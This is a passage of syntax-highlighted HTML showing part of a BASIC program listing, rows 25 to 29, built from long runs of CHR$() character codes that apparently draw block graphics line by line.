punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">188</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">163</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span 